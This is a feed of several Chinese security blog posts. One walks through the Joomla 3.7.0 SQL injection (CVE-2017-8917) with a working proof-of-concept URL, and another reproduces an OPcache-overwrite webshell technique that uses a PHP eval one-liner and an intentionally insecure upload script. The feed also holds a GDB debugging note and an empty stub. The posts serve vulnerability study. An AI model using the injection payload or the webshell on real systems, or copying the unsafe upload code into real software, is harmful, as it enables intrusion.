<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-05-19T09:48:14.439Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析</title>
    <link href="http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection分析/</id>
    <published>2017-05-19T01:39:18.000Z</published>
    <updated>2017-05-19T09:48:14.439Z</updated>
    
    <content type="html"><![CDATA[<p>Joomla!3.7.0 Core SQL注入漏洞.<br><a id="more"></a></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>这次干脆先放出poc吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/Joomla370/index.php?</div><div class="line">option=com_fields</div><div class="line">&amp;view=fields</div><div class="line">&amp;layout=modal</div><div class="line">&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0)</div></pre></td></tr></table></figure></p>
<p>这次根据参数的传入流程来进行分析。</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="危害组件"><a href="#危害组件" class="headerlink" title="危害组件"></a>危害组件</h2><p>3.7.0版本中出现了<code>com_field</code>组件,无需授权即可访问。查看<code>...\components\com_fields\controller.php</code>，在第27行左右，其相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config = array<span class="params">()</span>)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;input = JFactory::getApplication()-&gt;input;</div><div class="line"></div><div class="line">		<span class="comment">// Frontpage Editor Fields Button proxying:</span></div><div class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'view'</span>) === <span class="string">'fields'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'layout'</span>) === <span class="string">'modal'</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="comment">// Load the backend language file.</span></div><div class="line">			$lang = JFactory::getLanguage();</div><div class="line">			$lang-&gt;load(<span class="string">'com_fields'</span>, JPATH_ADMINISTRATOR);</div><div class="line"></div><div class="line">			$config[<span class="string">'base_path'</span>] = JPATH_COMPONENT_ADMINISTRATOR;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">parent</span>::__construct($config);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到它先判断通过<code>view</code>是否等于<code>fields</code>,<code>layout</code>是否等于<code>modal</code>,而这两个参数都是我们可控的。若满足则将会加载<code>JPATH_ADMINISTRATOR</code>中的<code>com_fields</code>组件，并且将<code>base_path</code>设置为 <code>JPATH_COMPONENT_ADMINISTRATOR</code>，之后调用父类的构造方法。</p>
<h2 id="传入sql语句"><a href="#传入sql语句" class="headerlink" title="传入sql语句"></a>传入sql语句</h2><p>在调用父类构造方法后，一路运行到<code>...\Joomla370\libraries\legacy\controller\legacy.php</code>中，约莫707行，这时会通过<code>$this-&gt;$doTask</code>调用<code>display()</code>函数。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/calldisplay.jpg" alt=""></p>
<p>跟进<code>display()</code>函数，它位于 <code>...\Joomla370\libraries\legacy\controller\legacy.php</code>，接着运行至legacy.php的约莫671行左右，调用了视图（view）的<code>display()</code>函数。我们跟进一下，跳转进入<code>...\Joomla370\administrator\components\com_fields\views\fields\view.html.php</code>，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/viewdisplay2.jpg?raw=true" alt=""></p>
<p>此时运行到，下面这条语句，给<code>get()</code>传入的参数为<code>State</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;state         = <span class="keyword">$this</span>-&gt;get(<span class="string">'State'</span>);</div></pre></td></tr></table></figure>
<p>我们跟进这个<code>get()</code>函数，一直运行到422行，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getState.jpg?raw=true" alt=""></p>
<p>之后将会调用 <code>getState()</code>，跟进，进入<code>...\Joomla370\libraries\legacy\model\legacy.php</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callpopulateState.jpg" alt=""></p>
<p>之后会调用filedsModel类中的<code>populateState()</code>，跟进后会发现调用其父类的<code>populateState()</code>函数，其定义在 <code>...\Joomla370\libraries\legacy\model\list.php</code>中，约莫在第495行，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">..省略..</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($list = $app-&gt;getUserStateFromRequest(<span class="keyword">$this</span>-&gt;context . <span class="string">'.list'</span>, <span class="string">'list'</span>, <span class="keyword">array</span>(), <span class="string">'array'</span>))</div><div class="line"></div><div class="line">..省略..</div></pre></td></tr></table></figure></p>
<p>这里我们先跟进一下<code>getUserStateFromRequest()</code>，它的定义在<code>...\Joomla370\libraries\cms\application\cms.php</code>中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了<code>fullordering</code>的值。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/fullordering.jpg" alt=""></p>
<p>在该函数运行完后，流程将会回到前面的那个定义在<code>...\Joomla370\libraries\cms\application\cms.php</code>中的<code>populateState()</code>函数。此时运行的代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> ($list <span class="keyword">as</span> $name =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="comment">// Exclude if blacklisted</span></div><div class="line">	<span class="keyword">if</span> (!in_array($name, <span class="keyword">$this</span>-&gt;listBlacklist))</div><div class="line">	&#123;</div><div class="line">		<span class="comment">// Extra validations</span></div><div class="line">		<span class="keyword">switch</span> ($name)&#123;...&#125;</div><div class="line">		<span class="keyword">$this</span>-&gt;setState(<span class="string">'list.'</span> . $name, $value);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如果数组的key不在黑名单（blacklisted）中，将会为<code>$list</code>变量根据相应的<code>State</code>进行注册，在这部分函数运行到结束部分，可以看见成功的控制了<code>list</code>数组的<code>fullordering</code>的值。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/thissetstate.jpg?raw=true" alt=""></p>
<p>查看变量，如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/arraylist.jpg?raw=true" alt=""></p>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>接下来继续运行，一直运行回到<code>Joomla370\administrator\components\com_fields\views\fields\view.html.php</code>中的<code>display()</code>函数中。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/getitem.jpg?raw=true" alt=""></p>
<p>跟进这一行 <code>$this-&gt;get(&#39;Items&#39;);</code>，进入<code>...\Joomla370\libraries\legacy\view\legacy.php</code>，约莫在422行,这里的行为跟前面分析类似，此后将会调用<code>getitem()</code>：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/callgetitem.jpg?raw=true" alt=""></p>
<p>继续跟进，进入<code>...\Joomla370\libraries\legacy\model\list.php</code>，约莫在186行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span></div><div class="line">	&#123;</div><div class="line">		<span class="comment">// Load the list items and add the items to the internal cache.</span></div><div class="line">		<span class="keyword">$this</span>-&gt;cache[$store] = <span class="keyword">$this</span>-&gt;_getList(<span class="keyword">$this</span>-&gt;_getListQuery(), <span class="keyword">$this</span>-&gt;getStart(), <span class="keyword">$this</span>-&gt;getState(<span class="string">'list.limit'</span>));</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>通过<code>_getList</code>调用了<code>_getListQuery</code>,继续跟进，进入<code>...\Joomla370\libraries\legacy\model\list.php</code>，约莫在 132行，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if ($lastStoreId != $currentStoreId || empty($this-&gt;query))</div><div class="line">&#123;</div><div class="line">	$lastStoreId = $currentStoreId;</div><div class="line">	$this-&gt;query = $this-&gt;getListQuery();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>调用了 <code>getListQuery()</code>，继续跟进，进入 <code>...\Joomla370\administrator\components\com_fields\models\fields.php</code>,一直运行到约莫在 305 行，调用<code>getState</code>方法，传入<code>list.fullordering</code>参数。相关代码如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listordering2.jpg?raw=true" alt=""></p>
<p>查看变量表：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/listfullordering3.jpg?raw=true" alt=""></p>
<p>之后在第314行，将<code>$listOrdering</code>带入查询，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$query-&gt;order($db-&gt;escape($listOrdering) . <span class="string">' '</span> . $db-&gt;escape($orderDirn));</div></pre></td></tr></table></figure></p>
<p>在进行<code>$query-&gt;order</code>之前，会先进行一次过滤，跟进<code>$db-&gt;escape</code>，进入<code>...\Joomla370\libraries\joomla\database\driver\mysqli.php</code>，约莫242行，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">($text, $extra = false)</span></span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">$this</span>-&gt;connect();</div><div class="line"></div><div class="line">		$result = mysqli_real_escape_string(<span class="keyword">$this</span>-&gt;getConnection(), $text);</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ($extra)</div><div class="line">		&#123;</div><div class="line">			$result = addcslashes($result, <span class="string">'%_'</span>);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> $result;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>对于传入的<code>$text</code>通过<code>mysqli_real_escape_string()</code>进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。</p>
<h1 id="成功注入"><a href="#成功注入" class="headerlink" title="成功注入"></a>成功注入</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170519/poc.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Joomla!3.7.0 Core SQL注入漏洞.&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PHP弱类型问题小结</title>
    <link href="http://yoursite.com/2017/05/17/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E9%97%AE%E9%A2%98%E5%B0%8F%E7%BB%93/"/>
    <id>http://yoursite.com/2017/05/17/PHP弱类型问题小结/</id>
    <published>2017-05-17T06:25:16.000Z</published>
    <updated>2017-05-19T09:45:30.369Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些php弱类型问题及CTF中的绕过。<br>还没开始写哈哈</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一些php弱类型问题及CTF中的绕过。&lt;br&gt;还没开始写哈哈&lt;/p&gt;

    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="弱类型" scheme="http://yoursite.com/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>一次水水的调试</title>
    <link href="http://yoursite.com/2017/05/16/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84GDB%E8%B0%83%E8%AF%95/"/>
    <id>http://yoursite.com/2017/05/16/一次简单的GDB调试/</id>
    <published>2017-05-16T14:48:05.000Z</published>
    <updated>2017-05-16T15:44:13.077Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 作业…<br><a id="more"></a></p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -g -O0 array.c main.c -o test</div></pre></td></tr></table></figure>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb test</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/1.jpg?raw=true" alt=""></p>
<p>通过list命令，可以显示出部分源代码，我们选择在源代码的第9行处下断点。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/2.jpg?raw=true" alt=""></p>
<p>通过print命令，可以查看变量的值，因为数组名已知，可以如下打印出数组的内容。可以发现，在还没有初始化或者赋值前，数组内容是随机化（或者说是垃圾数据）。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/3.jpg?raw=true" alt=""></p>
<p>此时程序运行到第9行附近，可以再次通过list命令显示其附近的源代码。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/4.jpg?raw=true" alt=""></p>
<p>这里为了方便，我们在第11，12，15行下下断点，分别对应两个<code>array_fill_with()</code> 函数 和 <code>array_add()</code>函数。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/5.jpg?raw=true" alt=""></p>
<p>接下来单步调试，命令是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ n</div></pre></td></tr></table></figure>
<p>此时在执行完第11行的<code>array_fill_with()</code>,即已经完成了对数组<code>vector_a</code>的赋值后，我们查看下三个数组的值。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170516/7.jpg?raw=true" alt=""></p>
<p>数组<code>vector_a</code>全被赋值为<code>10</code>在意料之中（0xa == 10 ），但注意数组<code>vector_b</code>的第一个元素也被赋值为<code>0xa</code>了。在前面可知，数组<code>vector_b</code>的第一个元素原本是<code>0xff00</code>。所以这边可能产生了一个越界。</p>
<p>下一条语句是对数组<code>vector_b</code>进行赋值，这次我们选择进入函数<code>array_fill_with()</code>，即进行<code>step into</code>，gdb中相应的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ s</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170516/8.jpg?raw=true" alt=""></p>
<p>由上图，通过<code>list</code>命令，可知我们已经进入到了<code>array.c</code>中的第七行，正在进行一个循环。其中变量<code>length</code>的值为<code>0x10</code>，即为16。</p>
<p>我们知道，在C语言中，数组下标是从0开始的，这里也就解释了为什么我们再对数组<code>vector_a</code>赋值完后，数组<code>vector_b</code>的第一个元素也被改变了。</p>
<p>接下来我们继续运行程序，命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ c</div></pre></td></tr></table></figure></p>
<p>此时，已经完成了对数组<code>vector_b</code>的赋值，我们可以推测数组<code>vector_c</code>的第一个元素也会被从原先的 0x0 改为 0x37。事实证明，推测是正确的，见下图：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170516/9.jpg" alt=""></p>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>其实重点就一个，C语言中数组下标从0开始的。<br>把<code>array.c</code>中的<code>i &lt;= length</code> 改为 <code>i &lt; length</code>就ok啦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux 作业…&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用PHP的OPcache机制getshell</title>
    <link href="http://yoursite.com/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/"/>
    <id>http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/</id>
    <published>2017-05-13T15:04:03.000Z</published>
    <updated>2017-05-14T04:59:10.483Z</updated>
    
    <content type="html"><![CDATA[<p>OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。<br>本文是对 <a href="http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/" target="_blank" rel="external">《binary-webshell-through-opcache-in-php-7》</a>一文的测试。<br><a id="more"></a></p>
<h1 id="关于OPcache"><a href="#关于OPcache" class="headerlink" title="关于OPcache"></a>关于OPcache</h1><p>在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是<code>/var/www/html/opcache</code>，未访问前，<code>opcache</code>文件夹为空。接下去我去访问 <code>index.php</code>后，php会在 <code>opcache</code>文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 <code>index.php</code>所在目录结构相同，同时生成了 <code>index.php.bin</code>。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/tree.jpg" alt=""><br>这个<code>index.php.bin</code> 就是 <code>index.php</code> 的缓存文件。并且作为<code>www-data</code>用户，我们对 <code>5672f68788bcb25b11403b33f5d1497f</code> 具有读写执行权限。这样，我们想办法把这个<code>index.php.bin</code>替换为包含有恶意代码的<code>index.php.bin</code>文件，当我们再次去访问<code>index.php</code>时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@4db5ba2ab3bf:/var/www/html# php -v</div><div class="line">PHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )</div><div class="line">Copyright (c) 1997-2017 The PHP Group</div><div class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</div><div class="line">    with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies</div></pre></td></tr></table></figure>
<h2 id="配置OPcache"><a href="#配置OPcache" class="headerlink" title="配置OPcache"></a>配置OPcache</h2><h3 id="开启OPcache"><a href="#开启OPcache" class="headerlink" title="开启OPcache"></a>开启OPcache</h3><p>在php配置文件 <code>php.ini</code> 的约莫 1745 行左右，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.enable=0</div></pre></td></tr></table></figure></p>
<p>去掉前面的分号<code>;</code>，将<code>0</code>改为<code>1</code>，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.enable=1</div></pre></td></tr></table></figure></p>
<h3 id="关闭时间戳验证"><a href="#关闭时间戳验证" class="headerlink" title="关闭时间戳验证"></a>关闭时间戳验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.validate_timestamps=1</div></pre></td></tr></table></figure>
<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.validate_timestamps=0</div></pre></td></tr></table></figure></p>
<h3 id="设置OPcache缓存路径"><a href="#设置OPcache缓存路径" class="headerlink" title="设置OPcache缓存路径"></a>设置OPcache缓存路径</h3><p>继续向下翻，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache=</div></pre></td></tr></table></figure></p>
<p>这里我修改后的配置是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache= &quot;/var/www/html/opcache&quot;</div></pre></td></tr></table></figure></p>
<h3 id="设置缓存文件优先级"><a href="#设置缓存文件优先级" class="headerlink" title="设置缓存文件优先级"></a>设置缓存文件优先级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache_only=0</div></pre></td></tr></table></figure>
<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache_only=1</div></pre></td></tr></table></figure></p>
<h3 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h3><p>这里我以apache作为web服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 resart</div></pre></td></tr></table></figure></p>
<p>重启，使前面修改的<code>php.ini</code>生效</p>
<h2 id="www目录"><a href="#www目录" class="headerlink" title="www目录"></a>www目录</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    	&lt;form action=<span class="string">"upload-file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    		&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;filename:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</div><div class="line">    		&lt;br/&gt;</div><div class="line">        	&lt;label <span class="keyword">for</span>=<span class="string">"filepath"</span>&gt;filepath:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"text"</span> name=<span class="string">"filepath"</span> id=<span class="string">"filepath"</span> /&gt;</div><div class="line">        	&lt;br/&gt;</div><div class="line">    		&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</div><div class="line">    	&lt;/form&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload-file.php"></a>upload-file.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$path = $_POST[<span class="string">'filepath'</span>];</div><div class="line">    <span class="keyword">echo</span> <span class="string">"filename: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;   </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],  $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"save : "</span> . $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];    </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>那个。。代码写得很丑。。仅为测试之用：）</p>
<h3 id="phpinfo-php"><a href="#phpinfo-php" class="headerlink" title="phpinfo.php"></a>phpinfo.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>现在开始黑盒测试。。</p>
<h2 id="利用phpinfo获取信息"><a href="#利用phpinfo获取信息" class="headerlink" title="利用phpinfo获取信息"></a>利用phpinfo获取信息</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachefilecache.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachetimestamp.jpg?raw=true" alt=""><br>可知，OPcache缓存路径在 <code>/var/www/html/opcache</code> 中。且服务器端开启了 <code>opcache.file_cache_only</code>,禁用了<code>opcache.validate_timestamps</code>。 这是能成功利用的条件。</p>
<h2 id="php7-opcache-override-py"><a href="#php7-opcache-override-py" class="headerlink" title="php7-opcache-override.py"></a>php7-opcache-override.py</h2><p>由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">hp7-opcache-override.py</a> 来计算。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/systemid.jpg" alt=""></p>
<p>得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f</p>
<h2 id="构建恶意的缓存文件"><a href="#构建恶意的缓存文件" class="headerlink" title="构建恶意的缓存文件"></a>构建恶意的缓存文件</h2><p>恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 <code>index.php</code>,内容是一句话木马<code>&lt;?php @eval($_POST[test]);?&gt;</code>，之后访问它。在对应的缓存文件夹里可以看到<code>index.php.bin</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/local.jpg?raw=true" alt=""><br>用十六进制编辑器打开，将<code>OPCACHE.</code>后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/bin2.jpg" alt=""></p>
<h2 id="覆盖原缓存文件"><a href="#覆盖原缓存文件" class="headerlink" title="覆盖原缓存文件"></a>覆盖原缓存文件</h2><p>在覆盖之前，先看看服务器上的原缓存文件长啥样：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/beforeupload.jpg?raw=true" alt=""></p>
<p>这里利用上传来进行覆盖。访问<code>index.php</code>,选择修改后的<code>index.php.bin</code>进行上传，上传路径为要覆盖的缓存文件的相对地址 <code>opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/</code>。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/upload.jpg?raw=true" alt=""></p>
